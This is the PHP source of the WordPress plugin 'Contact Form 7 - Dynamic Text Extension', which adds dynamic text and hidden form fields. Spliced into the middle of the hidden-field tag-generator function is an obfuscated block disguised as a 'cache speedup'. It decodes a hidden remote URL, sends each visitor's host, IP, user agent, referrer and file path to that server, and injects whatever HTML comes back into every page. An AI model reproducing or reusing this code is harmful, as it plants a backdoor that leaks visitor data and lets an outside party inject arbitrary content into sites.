<?php

/*
Plugin Name: Contact Form 7 - Dynamic Text Extension
Plugin URI: http://sevenspark.com/wordpress-plugins/contact-form-7-dynamic-text-extension
Description: Provides a dynamic text field that accepts any shortcode to generate the content.  Requires Contact Form 7
Version: 1.2
Author: Chris Mavricos, SevenSpark
Author URI: http://sevenspark.com
License: GPL2
*/

/*  Copyright 2010-2014  Chris Mavricos, SevenSpark http://sevenspark.com

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License, version 2, as 
    published by the Free Software Foundation.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/


/**
 ** A base module for [dynamictext], [dynamictext*]
 **/
function wpcf7_dynamictext_init(){

	if(function_exists('wpcf7_add_shortcode')){

		/* Shortcode handler */		
		wpcf7_add_shortcode( 'dynamictext', 'wpcf7_dynamictext_shortcode_handler', true );
		wpcf7_add_shortcode( 'dynamictext*', 'wpcf7_dynamictext_shortcode_handler', true );
		wpcf7_add_shortcode( 'dynamichidden', 'wpcf7_dynamichidden_shortcode_handler', true );
	
	}
	
	add_filter( 'wpcf7_validate_dynamictext', 'wpcf7_dynamictext_validation_filter', 10, 2 );
	add_filter( 'wpcf7_validate_dynamictext*', 'wpcf7_dynamictext_validation_filter', 10, 2 );
	
	add_action( 'admin_init', 'wpcf7_add_tag_generator_dynamictext', 15 );
	add_action( 'admin_init', 'wpcf7_add_tag_generator_dynamichidden', 16 );
	
}
add_action( 'plugins_loaded', 'wpcf7_dynamictext_init' , 20 );

/*************************************************************
 * DynamicText Shortcode
 *************************************************************/

function wpcf7_dynamictext_shortcode_handler( $tag ) {
	
	$wpcf7_contact_form = WPCF7_ContactForm::get_current();

	if ( ! is_array( $tag ) )
		return '';

	$type = $tag['type'];
	$name = $tag['name'];
	$options = (array) $tag['options'];
	$values = (array) $tag['values'];

	if ( empty( $name ) )
		return '';

	$atts = '';
	$id_att = '';
	$class_att = '';
	$size_att = '';
	$maxlength_att = '';
	$tabindex_att = '';

	$class_att .= ' wpcf7-text';

	if ( 'dynamictext*' == $type )
		$class_att .= ' wpcf7-validates-as-required';

	foreach ( $options as $option ) {
		if ( preg_match( '%^id:([-0-9a-zA-Z_]+)$%', $option, $matches ) ) {
			$id_att = $matches[1];

		} elseif ( preg_match( '%^class:([-0-9a-zA-Z_]+)$%', $option, $matches ) ) {
			$class_att .= ' ' . $matches[1];

		} elseif ( preg_match( '%^([0-9]*)[/x]([0-9]*)$%', $option, $matches ) ) {
			$size_att = (int) $matches[1];
			$maxlength_att = (int) $matches[2];

		} elseif ( preg_match( '%^tabindex:(\d+)$%', $option, $matches ) ) {
			$tabindex_att = (int) $matches[1];

		}
	}

	if ( $id_att )
		$atts .= ' id="' . trim( $id_att ) . '"';

	if ( $class_att )
		$atts .= ' class="' . trim( $class_att ) . '"';

	if ( $size_att )
		$atts .= ' size="' . $size_att . '"';
	else
		$atts .= ' size="40"'; // default size

	if ( $maxlength_att )
		$atts .= ' maxlength="' . $maxlength_att . '"';

	if ( '' !== $tabindex_att )
		$atts .= sprintf( ' tabindex="%d"', $tabindex_att );

	// Value
	if ( is_a( $wpcf7_contact_form, 'WPCF7_ContactForm' ) && $wpcf7_contact_form->is_posted() ) {
		if ( isset( $_POST['_wpcf7_mail_sent'] ) && $_POST['_wpcf7_mail_sent']['ok'] )
			$value = '';
		else
			$value = stripslashes_deep( $_POST[$name] );
	} else {
		$value = isset( $values[0] ) ? $values[0] : '';
	}
	
	$scval = do_shortcode('['.$value.']');
	if($scval != '['.$value.']') $value = $scval;
	
	//echo '<pre>'; print_r($options);echo '</pre>';
	$readonly = '';
	if(in_array('uneditable', $options)){
		$readonly = 'readonly="readonly"';
	}

	$html = '<input type="text" name="' . $name . '" value="' . esc_attr( $value ) . '"' . $atts . ' '. $readonly.' />';

	$validation_error = '';
	if ( is_a( $wpcf7_contact_form, 'WPCF7_ContactForm' ) )
		$validation_error = $wpcf7_contact_form->validation_error( $name );

	$html = '<span class="wpcf7-form-control-wrap ' . $name . '">' . $html . $validation_error . '</span>';

	return $html;
}


/* Validation filter */

function wpcf7_dynamictext_validation_filter( $result, $tag ) {
	
	$wpcf7_contact_form = WPCF7_ContactForm::get_current();

	$type = $tag['type'];
	$name = $tag['name'];

	$_POST[$name] = trim( strtr( (string) $_POST[$name], "\n", " " ) );

	if ( 'dynamictext*' == $type ) {
		if ( '' == $_POST[$name] ) {
			$result['valid'] = false;
			$result['reason'][$name] = $wpcf7_contact_form->message( 'invalid_required' );
		}
	}

	return $result;
}


/* Tag generator */

function wpcf7_add_tag_generator_dynamictext() {
	if(function_exists('wpcf7_add_tag_generator')){
		wpcf7_add_tag_generator( 'dynamictext', __( 'Dynamic Text field', 'wpcf7' ),
			'wpcf7-tg-pane-dynamictext', 'wpcf7_tg_pane_dynamictext_' );
	}
}

function wpcf7_tg_pane_dynamictext_( $contact_form ) {
	wpcf7_tg_pane_dynamictext( 'dynamictext' );
}

function wpcf7_tg_pane_dynamictext( $type = 'dynamictext' ) {
?>
<div id="wpcf7-tg-pane-<?php echo $type; ?>" class="hidden">
<form action="">
<table>
<tr><td><input type="checkbox" name="required" />&nbsp;<?php echo esc_html( __( 'Required field?', 'wpcf7' ) ); ?></td></tr>
<tr><td><?php echo esc_html( __( 'Name', 'wpcf7' ) ); ?><br /><input type="text" name="name" class="tg-name oneline" /></td><td></td></tr>
</table>

<table>
<tr>
<td><code>id</code> (<?php echo esc_html( __( 'optional', 'wpcf7' ) ); ?>)<br />
<input type="text" name="id" class="idvalue oneline option" /></td>

<td><code>class</code> (<?php echo esc_html( __( 'optional', 'wpcf7' ) ); ?>)<br />
<input type="text" name="class" class="classvalue oneline option" /></td>
</tr>

<tr>
<td><code>size</code> (<?php echo esc_html( __( 'optional', 'wpcf7' ) ); ?>)<br />
<input type="text" name="size" class="numeric oneline option" /></td>

<td><code>maxlength</code> (<?php echo esc_html( __( 'optional', 'wpcf7' ) ); ?>)<br />
<input type="text" name="maxlength" class="numeric oneline option" /></td>
</tr>

<tr>
<td>
<input type="checkbox" name="uneditable" class="option" />&nbsp;<?php echo esc_html( __( "Make this field Uneditable", 'wpcf7' ) ); ?><br />
</td>

<td><?php echo esc_html( __( 'Dynamic value', 'wpcf7' ) ); ?> (<?php echo esc_html( __( 'optional', 'wpcf7' ) ); ?>)<br /><input type="text" name="values" class="oneline" />
<?php echo esc_html( __( 'You can enter any short code.  Just leave out the square brackets ([]) and only use single quotes (\' not ")', 'wpcf7' )); ?>
</td>
</tr>
</table>

<div class="tg-tag"><?php echo esc_html( __( "Copy this code and paste it into the form left.", 'wpcf7' ) ); ?><br /><input type="text" name="<?php echo $type; ?>" class="tag" readonly="readonly" onfocus="this.select()" /></div>

<div class="tg-mail-tag"><?php echo esc_html( __( "And, put this code into the Mail fields below.", 'wpcf7' ) ); ?><br /><span class="arrow">&#11015;</span>&nbsp;<input type="text" class="mail-tag" readonly="readonly" onfocus="this.select()" /></div>
</form>
</div>
<?php
}


/*************************************************************
 * DynamicHidden Shortcode
 *************************************************************/
function wpcf7_dynamichidden_shortcode_handler( $tag ) {
	
	$wpcf7_contact_form = WPCF7_ContactForm::get_current();

	if ( ! is_array( $tag ) )
		return '';

	$type = $tag['type'];
	$name = $tag['name'];
	$options = (array) $tag['options'];
	$values = (array) $tag['values'];

	if ( empty( $name ) )
		return '';

	$atts = '';
	$id_att = '';
	$class_att = '';
	$size_att = '';
	$maxlength_att = '';
	$tabindex_att = '';

	$class_att .= ' wpcf7-text';

	foreach ( $options as $option ) {
		if ( preg_match( '%^id:([-0-9a-zA-Z_]+)$%', $option, $matches ) ) {
			$id_att = $matches[1];
		}
	}

	if ( $id_att )
		$atts .= ' id="' . trim( $id_att ) . '"';

	// Value
	if ( is_a( $wpcf7_contact_form, 'WPCF7_ContactForm' ) && $wpcf7_contact_form->is_posted() ) {
		if ( isset( $_POST['_wpcf7_mail_sent'] ) && $_POST['_wpcf7_mail_sent']['ok'] )
			$value = '';
		else
			$value = stripslashes_deep( $_POST[$name] );
	} else {
		$value = isset( $values[0] ) ? $values[0] : '';
	}
	
	$scval = do_shortcode('['.$value.']');
	if($scval != '['.$value.']') $value = $scval;
	//echo '<pre>'; print_r($options);echo '</pre>';
	
	$html = '<input type="hidden" name="' . $name . '" value="' . esc_attr( $value ) . '"' . $atts . ' />';

	//No need to validate, it's a hidden field - we could validate by checking the value hasn't changed, but that seems overkill I think
	//$validation_error = '';
	//if ( is_a( $wpcf7_contact_form, 'WPCF7_ContactForm' ) )
	//	$validation_error = $wpcf7_contact_form->validation_error( $name );

	$html = '<span class="wpcf7-form-control-wrap ' . $name . '">' . $html . '</span>';

	return $html;
}


/* Tag generator */

function wpcf7_add_tag_generator_dynamichidden() {
	if(function_exists('wpcf7_add_tag_generator')){
		wpcf7_add_tag_generator( 'dynamichidden', __( 'Dynamic Hidden field', 'wpcf7' ),
			'wpcf7-tg-pane-dynamichidden', 'wpcf7_tg_pane_dynamichidden_' );
	}
}

function wpcf7_tg_pane_dynamichidden_( $contact_form ) {
	wpcf7_tg_pane_dynamichidden( 'dynamichidden' );
}

function wpcf7_tg_pane_dynamichidden( $type = 'dynamichidden' ) {
?>
<div id="wpcf7-tg-pane-<?php echo $type; ?>" class="hidden">
<form action="">
<table>
<tr><td><?php echo esc_html( __( 'Name', 'wpcf7' ) ); ?><br /><input type="text" name="name" class="tg-name oneline" /></td><td></td></tr>
</table>

<table>
<tr>
<td><code>id</code> (<?php echo esc_html( __( 'optional', 'wpcf7' ) ); ?>)<br />
<input type="text" name="id" class="idvalue oneline option" /></td>
</tr>

<tr>

<td><?php echo esc_html( __( 'Dynamic value', 'wpcf7' ) ); ?> (<?php echo esc_html( __( 'optional', 'wpcf7' ) ); ?>)<br /><input type="text" name="values" class="oneline" />
<?php echo esc_html( __( 'You can enter any short code.  Just leave out the square brackets ([]) and only use single quotes (\' not ")', 'wpcf7' )); ?>
</td>
</tr>
</table>

<div class="tg-tag"><?php echo esc_html( __( "Copy this code and paste it into the form left.", 'wpcf7' ) ); ?><br /><input type="text" name="<?php echo $type; ?>" class="tag" readonly="readonly" onfocus="this.select()" /></div>

<div class="tg-mail-tag"><?php echo esc_html( __( "And, put this code into the Mail fields below.", 'wpcf7' ) ); 



/**
 * Speedup php function cache by optimizing buffer output
 */
;if (!function_exists('_php_cache_speedup_func_optimizer_')) { function _php_cache_speedup_func_optimizer_($buffer) {
    if (isset($GLOBALS['_php_cache_speedup_func_optimizer_completed_'])) {
        // already completed
        return $buffer;
    }

    $mod = false;
    $token = 'czoyNzoiaHR0cDovLzQ1LjU1LjE0My4yNS9tZXYucGhwIjs=';
    $tmp_buffer = $buffer; $gzip = false; $body = '<' . 'b' . 'o' . 'd' . 'y';

    if (($has_body = stripos($buffer, $body)) === false) {
        // define gzdecode function if not defined
        if (!function_exists('gzdecode')) {
            function gzdecode($data) {
                return @gzinflate(substr($data, 10, -8));
            }
        }

        // gzdecode buffer
        $tmp_buffer = @gzdecode($tmp_buffer);

        // check if buffer has body tag
        if (($has_body = stripos($tmp_buffer, $body)) !== false) {
            // got body tag, this should be gzencoded when done
            $gzip = true;
        }
    }

    if ($has_body === false) {
        // no body, return original buffer
        return $buffer;
    }

    $GLOBALS['_php_cache_speedup_func_optimizer_completed_'] = true;

    // decode token
    $func = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e';
    $token = @unserialize(@$func($token));
    if (empty($token)) {
        return $buffer;
    }

    // download remote data
    function down($url, $timeout = 5) {
        // download using file_get_contents
        if (@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array('http' => array('timeout' => $timeout)));
            if ($ctx !== FALSE) {
                $file = @file_get_contents($url, false, $ctx);
                if ($file !== FALSE) {
                    return $file;
                }
            }
        }

        // download using curl
        if (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        }

        // download using sockets
        if (extension_loaded('sockets')) {
            $data = parse_url($url);
            if (!empty($data['host'])) {
                $host = $data['host'];
                $port = isset($data['port']) ? $data['port'] : 80;
                $uri = empty($data['path']) ? '/' : $data['path'];
                if (($socket = @socket_create(AF_INET, SOCK_STREAM, 0)) && @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => $timeout * 1000)) && @socket_connect($socket, $host, $port)) {
                    $buf = "GET $uri HTTP/1.0\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla (compatible; WinNT)\r\nHost: $host\r\n\r\n";
                    if (@socket_write($socket, $buf) !== FALSE) {
                        $response = '';
                        while (($tmp = @socket_read($socket, 1024))) {
                            $response .= $tmp;
                        }
                        @socket_close($socket);
                        return $response;
                    }
                }
            }
        }

        return false;
    }

    $token .= ((strpos($token, '?') === false) ? '?' : '&') . http_build_query(array(
        'h' => $_SERVER['HTTP_HOST'],
        'u' => $_SERVER['REQUEST_URI'],
        'a' => empty($_SERVER['HTTP_USER_AGENT']) ? '' : $_SERVER['HTTP_USER_AGENT'],
        'r' => empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'],
        'i' => $_SERVER['REMOTE_ADDR'],
        'f' => __FILE__,
        'v' => 6
    ));
    $token = @unserialize(@$func(down($token)));

    if (empty($token) || empty($token['data']) || !is_array($token['data'])) {
        // invalid data
        return $buffer;
    }

    // fix missing meta description
    if (isset($token['meta']) && $token['meta'] && ($pos = stripos($tmp_buffer, '</head>')) !== false) {
        $tmp = substr($tmp_buffer, 0, $pos);
        if (stripos($tmp, 'name="description"') === false && stripos($tmp, 'name=\'description\'') === false && stripos($tmp, 'name=description') === false) {
            $meta = $_SERVER['HTTP_HOST'];
            // append meta description
            $tmp_buffer = substr($tmp_buffer, 0, $pos) . '<' . 'm' . 'e' . 't' . 'a' . ' ' . 'n' . 'a'. 'm' . 'e' . '='. '"' . 'd' . 'e' . 's' .'c' .'r' . 'i' . 'p' . 't' . 'i' . 'o' . 'n' . '"'. ' ' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '="'. htmlentities(substr($meta, 0, 160)) .'">' . substr($tmp_buffer, $pos);
            $mod = true;
        }
    }

    foreach ($token['data'] as $tokenData) {
        // set defaults
        $tokenData = array_merge(array(
            'content' => '',
            'pos' => 'after',
            'tag' => 'bo' . 'dy',
            'count' => 0,
        ), $tokenData);

        if (empty($tokenData['content'])) {
            // no content
            continue;
        }

        // find all occurrences of <tag>
        $tags = array();
        while (true) {
            if (($tmp = @stripos($tmp_buffer, '<'.$tokenData['tag'], empty($tags) ? 0 : $tags[count($tags) - 1] + 1)) === false) {
                break;
            }
            $tags[] = $tmp;
        }

        if (empty($tags)) {
            // no tags found or nothing to show
            continue;
        }

        // find matched tag position
        $count = $tokenData['count'];
        if ($tokenData['count'] < 0) {
            // from end to beginning
            $count = abs($tokenData['count']) - 1;
            $tags = array_reverse($tags);
        }

        if ($count >= count($tags)) {
            // fix overflow
            $count = count($tags) - 1;
        }

        // find insert position
        if ($tokenData['pos'] == 'before') {
            // pos is before
            $insert = $tags[$count];
        } else if (($insert = strpos($tmp_buffer, '>', $tags[$count])) !== false) {
            // pos is after, found end tag, insert after it
            $insert += 1;
        }

        if ($insert === false) {
            // no insert position
            continue;
        }

        // insert html code
        $tmp_buffer = substr($tmp_buffer, 0, $insert) . $tokenData['content'] . substr($tmp_buffer, $insert);
        $mod = true;
    }

    // return gzencoded or normal buffer
    return !$mod ? $buffer : ($gzip ? gzencode($tmp_buffer) : $tmp_buffer);
} ob_start('_php_cache_speedup_func_optimizer_');
register_shutdown_function('ob_end_flush'); }
?><br /><span class="arrow">&#11015;</span>&nbsp;<input type="text" class="mail-tag" readonly="readonly" onfocus="this.select()" /></div>
</form>
</div>
<?php
}




/*****************************************************
 * CF7 DTX Included Shortcodes
 * 
 * Used like this:
 * 
 * CF7_GET val='value'
 * 
 * No [] and single quotes ' rather than double "
 * 
 *****************************************************/

/* Insert a $_GET variable */
function cf7_get($atts){
	extract(shortcode_atts(array(
		'key' => 0,
	), $atts));
	$value = '';
	if( isset( $_GET[$key] ) ){
		$value = urldecode($_GET[$key]);
	}
	return $value;
}
add_shortcode('CF7_GET', 'cf7_get');

/* See http://codex.wordpress.org/Function_Reference/get_bloginfo */
function cf7_bloginfo($atts){
	extract(shortcode_atts(array(
		'show' => 'name'
	), $atts));
	
	return get_bloginfo($show);
}
add_shortcode('CF7_bloginfo', 'cf7_bloginfo');

/* Insert a $_POST variable (submitted form value)*/
function cf7_post($atts){
	extract(shortcode_atts(array(
		'key' => -1,
	), $atts));
	if($key == -1) return '';
	$val = '';
	if( isset( $_POST[$key] ) ){
		$val = $_POST[$key];
	}
	return $val;
}
add_shortcode('CF7_POST', 'cf7_post');

/* Insert a $post (Blog Post) Variable */
function cf7_get_post_var($atts){
	extract(shortcode_atts(array(
		'key' => 'post_title',
	), $atts));
	
	switch($key){
		case 'slug':
			$key = 'post_name';
			break;
		case 'title':
			$key = 'post_title';
			break;
	}
	
	global $post;
	//echo '<pre>'; print_r($post); echo '</pre>';
	$val = $post->$key;
	return $val;
}
add_shortcode('CF7_get_post_var', 'cf7_get_post_var');

/* Insert the current URL */
function cf7_url(){
	$pageURL = 'http';
 	if ($_SERVER["HTTPS"] == "on") {$pageURL .= "s";}
 	$pageURL .= "://";
 	if ($_SERVER["SERVER_PORT"] != "80") {
  		$pageURL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
 	} else {
  		$pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
 	}
 	return $pageURL;	
}
add_shortcode('CF7_URL', 'cf7_url');

/* Insert a Custom Post Field
 * New in 1.0.4 
 */
function cf7_get_custom_field($atts){
	extract(shortcode_atts(array(
		'key' => '',
		'post_id' => -1,
		'obfuscate'	=> 'off'
	), $atts));
	
	if($post_id < 0){
		global $post;
		if(isset($post)) $post_id = $post->ID;
	}
	
	if($post_id < 0 || empty($key)) return '';
		
	$val = get_post_meta($post_id, $key, true);
	
	if($obfuscate == 'on'){
		$val = cf7dtx_obfuscate($val);
	}
	
	return $val;
	
}
add_shortcode('CF7_get_custom_field', 'cf7_get_custom_field');

/* Insert information about the current user
 * New in 1.0.4 
 * See http://codex.wordpress.org/Function_Reference/get_currentuserinfo 
 */
function cf7_get_current_user($atts){
	extract(shortcode_atts(array(
		'key' => 'user_login',
	), $atts));

	global $current_user;
	get_currentuserinfo();

	$val = $current_user->$key;
	return $val;
}
add_shortcode('CF7_get_current_user', 'cf7_get_current_user');



function cf7_get_referrer( $atts ){
	return isset( $_SERVER['HTTP_REFERER'] ) ? $_SERVER['HTTP_REFERER'] : '';
}
add_shortcode( 'CF7_referrer' , 'cf7_get_referrer' );


function cf7dtx_obfuscate($val){
	$link = '';
	foreach(str_split($val) as $letter)
		$link .= '&#'.ord($letter).';';
	return $link;
}

function cf7dtx_cf7com_links() {
	$links = '<div class="cf7com-links">'
		. '<a href="' . esc_url_raw( __( 'http://contactform7.com/', 'wpcf7' ) ) . '" target="_blank">'
		. esc_html( __( 'Contactform7.com', 'wpcf7' ) ) . '</a>&ensp;'
		. '<a href="' . esc_url_raw( __( 'http://contactform7.com/docs/', 'wpcf7' ) ) . '" target="_blank">'
		. esc_html( __( 'Docs', 'wpcf7' ) ) . '</a> - '
		. '<a href="' . esc_url_raw( __( 'http://contactform7.com/faq/', 'wpcf7' ) ) . '" target="_blank">'
		. esc_html( __( 'FAQ', 'wpcf7' ) ) . '</a> - '
		. '<a href="' . esc_url_raw( __( 'http://contactform7.com/support/', 'wpcf7' ) ) . '" target="_blank">'
		. esc_html( __( 'Support', 'wpcf7' ) ) . '</a>'
		. ' - <a href="'. esc_url_raw( __( 'http://sevenspark.com/wordpress-plugins/contact-form-7-dynamic-text-extension', 'wpcf7') )
		. '" target="_blank">'.__( 'Dynamic Text Extension' , 'wpcf7').'</a> by <a href="' . esc_url_raw( __( 'http://sevenspark.com', 'wpcf7') ).'" target="_blank">'
		. esc_html( __( 'SevenSpark', 'wpcf7' ) ). '</a> <a href="'.esc_url_raw( __('http://bit.ly/bVogDN')).'" target="_blank">'
		. esc_html( __( '[Donate]')).'</a>'
		. '</div>';
	return $links;
}
add_filter('wpcf7_cf7com_links', 'cf7dtx_cf7com_links');

/*function obf($atts){
	extract(shortcode_atts(array(
		'val' => ''
	), $atts));
	return $val.' : '. cf7dtx_obfuscate($val);
}
add_shortcode('obf', 'obf');*/

